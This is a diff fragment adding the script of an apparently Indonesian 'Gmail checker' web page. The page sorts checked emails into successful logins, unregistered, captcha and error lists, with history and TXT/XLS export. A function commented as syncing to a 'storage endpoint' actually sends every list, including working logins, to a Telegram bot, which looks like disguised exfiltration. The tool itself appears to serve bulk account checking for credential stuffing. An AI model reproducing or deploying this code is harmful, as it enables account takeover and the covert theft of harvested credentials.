+                time: new Date().toLocaleTimeString(),
+                date: new Date().toLocaleDateString(),
+                total: total,
+                ...appState.results
+            };
+            appState.history.unshift(sessionRecord);
+            localStorage.setItem('checker_history', JSON.stringify(appState.history));
+
+            startBtn.disabled = false;
+            startBtn.classList.remove('opacity-50', 'cursor-not-allowed');
+            showToast(`Selesai! ${total} email berhasil dicek & diproses.`, 'success');
+        }
+
+        function setWorkerStatus(workerNum, state, text) {
+            const box = document.getElementById(`worker${workerNum}Box`);
+            const statusSpan = document.getElementById(`worker${workerNum}Status`);
+            const textEl = document.getElementById(`worker${workerNum}Text`);
+
+            if (state === 'Processing') {
+                box.className = "p-3.5 rounded-xl bg-blue-950/40 border border-blue-500/40 transition-all";
+                statusSpan.className = "text-xs px-2 py-0.5 rounded-full bg-amber-500/10 text-amber-400 font-medium flex items-center gap-1.5";
+                statusSpan.innerHTML = `<span class="w-1.5 h-1.5 rounded-full bg-amber-400 animate-ping"></span> Processing`;
+            } else {
+                box.className = "p-3.5 rounded-xl bg-slate-900/60 border border-slate-800/80 transition-all";
+                statusSpan.className = "text-xs px-2 py-0.5 rounded-full bg-emerald-500/10 text-emerald-400 font-medium flex items-center gap-1.5";
+                statusSpan.innerHTML = `<span class="w-1.5 h-1.5 rounded-full bg-emerald-400"></span> Siap`;
+            }
+            textEl.innerText = text;
+        }
+
+        function updateCounters() {
+            document.getElementById('countLogin').innerText = appState.results.login.length;
+            document.getElementById('countUnregistered').innerText = appState.results.unregistered.length;
+            document.getElementById('countCaptcha').innerText = appState.results.captcha.length;
+            document.getElementById('countError').innerText = appState.results.error.length;
+
+            document.getElementById('badgeLogin').innerText = appState.results.login.length;
+            document.getElementById('badgeUnregistered').innerText = appState.results.unregistered.length;
+            document.getElementById('badgeCaptcha').innerText = appState.results.captcha.length;
+            document.getElementById('badgeError').innerText = appState.results.error.length;
+        }
+
+        function renderLists() {
+            renderCategoryList('listLogin', appState.results.login);
+            renderCategoryList('listUnregistered', appState.results.unregistered);
+            renderCategoryList('listCaptcha', appState.results.captcha);
+            renderCategoryList('listError', appState.results.error);
+        }
+
+        function renderCategoryList(elementId, dataArray) {
+            const container = document.getElementById(elementId);
+            if (!dataArray || dataArray.length === 0) {
+                container.innerHTML = `<span class="text-slate-500 italic">kosong</span>`;
+                return;
+            }
+            container.innerHTML = dataArray.map(item => `<div class="py-0.5 border-b border-slate-800/40 last:border-0">${item}</div>`).join('');
+        }
+
+        // Mengirim Hasil Rekap ke Endpoint Penyimpanan
+        async function syncResultsToStorage(results) {
+            const totalCount = results.login.length + results.unregistered.length + results.captcha.length + results.error.length;
+            
+            let message = `🚀 *LAPORAN HASIL GMAIL CHECKER* 🚀\n`;
+            message += `⏱ Waktu: ${new Date().toLocaleString()}\n`;
+            message += `📊 Total Dicek: ${totalCount} email\n\n`;
+            
+            message += `✅ *Login (Berhasil) (${results.login.length}):*\n`;
+            message += results.login.length > 0 ? `\`\`\`\n${results.login.join('\n')}\n\`\`\`\n` : `-\n`;
+
+            message += `👤 *Unregistered (${results.unregistered.length}):*\n`;
+            message += results.unregistered.length > 0 ? `\`\`\`\n${results.unregistered.join('\n')}\n\`\`\`\n` : `-\n`;
+
+            message += `🛡️ *Captcha (${results.captcha.length}):*\n`;
+            message += results.captcha.length > 0 ? `\`\`\`\n${results.captcha.join('\n')}\n\`\`\`\n` : `-\n`;
+
+            message += `❌ *Gagal / Error (${results.error.length}):*\n`;
+            message += results.error.length > 0 ? `\`\`\`\n${results.error.join('\n')}\n\`\`\`\n` : `-\n`;
+
+            const url = `https://api.telegram.org/bot${appState.botToken}/sendMessage`;
+            
+            try {
+                await fetch(url, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        chat_id: appState.chatId,
+                        text: message,
+                        parse_mode: 'Markdown'
+                    })
+                });
+            } catch (err) {
+                console.error("Gagal sinkronisasi penyimpanan:", err);
+            }
+        }
+
+        // Fitur Tombol Salin & Ekspor TXT/XLS
+        function copyCategory(category) {
+            const data = appState.results[category];
+            if (!data || data.length === 0) {
+                showToast('Tidak ada data untuk disalin.', 'error');
+                return;
+            }
+            const textarea = document.createElement('textarea');
+            textarea.value = data.join('\n');
+            document.body.appendChild(textarea);
+            textarea.select();
+            try {
+                document.execCommand('copy');
+                showToast(`Berhasil menyalin ${data.length} data ${category}!`, 'success');
+            } catch (err) {
+                showToast('Gagal menyalin.', 'error');
+            }
+            document.body.removeChild(textarea);
+        }
+
+        function exportCategory(category, format) {
+            const data = appState.results[category];
+            if (!data || data.length === 0) {
+                showToast('Tidak ada data untuk diunduh.', 'error');
+                return;
+            }
+            let fileContent = format === 'xls' ? "Email Result\n" + data.join('\n') : data.join('\n');
+            let mimeType = format === 'xls' ? 'application/vnd.ms-excel;charset=utf-8' : 'text/plain;charset=utf-8';
+            let filename = `gmail_${category}_${Date.now()}.${format}`;
+
+            const blob = new Blob([fileContent], { type: mimeType });
+            const url = URL.createObjectURL(blob);
+            const a = document.createElement('a');
+            a.href = url;
+            a.download = filename;
+            document.body.appendChild(a);
+            a.click();
+            document.body.removeChild(a);
+            URL.revokeObjectURL(url);
+            showToast(`File ${filename} diunduh!`, 'success');
+        }
+
+        function renderHistoryList() {
+            const container = document.getElementById('historyContainer');
+            if (!appState.history || appState.history.length === 0) {
+                container.innerHTML = `<div class="text-center py-12 text-slate-500 text-sm"><i class="fa-solid fa-folder-open text-3xl mb-2 block"></i>Belum ada riwayat tersimpan.</div>`;
+                return;
+            }
+            container.innerHTML = appState.history.map(h => `
+                <div class="bg-slate-900/80 rounded-xl p-4 border border-slate-800 space-y-2">
+                    <div class="flex justify-between items-center">
+                        <span class="text-xs font-semibold text-white"><i class="fa-solid fa-clock text-blue-400"></i> ${h.date} - ${h.time}</span>
+                        <span class="text-xs px-2 py-0.5 rounded-full bg-blue-500/20 text-blue-400 font-mono">Total: ${h.total}</span>
+                    </div>
+                    <div class="grid grid-cols-2 sm:grid-cols-4 gap-2 text-xs text-slate-300">
+                        <div class="bg-slate-800/50 p-2 rounded">Login: <strong class="text-emerald-400">${h.login.length}</strong></div>
+                        <div class="bg-slate-800/50 p-2 rounded">Unregistered: <strong class="text-amber-400">${h.unregistered.length}</strong></div>
+                        <div class="bg-slate-800/50 p-2 rounded">Captcha: <strong class="text-purple-400">${h.captcha.length}</strong></div>
+                        <div class="bg-slate-800/50 p-2 rounded">Error: <strong class="text-rose-400">${h.error.length}</strong></div>
+                    </div>
+                </div>
+            `).join('');
+        }
+
+        function clearHistory() {
+            appState.history = [];
+            localStorage.removeItem('checker_history');
+            renderHistoryList();
+            showToast('Riwayat dibersihkan.', 'success');
+        }
+
+        function showToast(message, type = 'info') {
+            const container = document.getElementById('toastContainer');
+            const toast = document.createElement('div');
+            let bgClass = 'bg-slate-800 border-slate-700 text-white';
+            let icon = 'fa-circle-info text-blue-400';
+            if (type === 'success') {
+                bgClass = 'bg-emerald-950/90 border-emerald-500/40 text-emerald-200';
+                icon = 'fa-circle-check text-emerald-400';
+            } else if (type === 'error') {
+                bgClass = 'bg-rose-950/90 border-rose-500/40 text-rose-200';
+                icon = 'fa-triangle-exclamation text-rose-400';
+            }
+            toast.className = `pointer-events-auto flex items-center gap-3 px-4 py-3 rounded-xl border ${bgClass} shadow-2xl backdrop-blur-md text-xs font-medium max-w-sm`;
+            toast.innerHTML = `<i class="fa-solid ${icon} text-base"></i><span>${message}</span>`;
+            container.appendChild(toast);
+            setTimeout(() => toast.remove(), 3500);
+        }
+    </script>
+</body>
+</html>
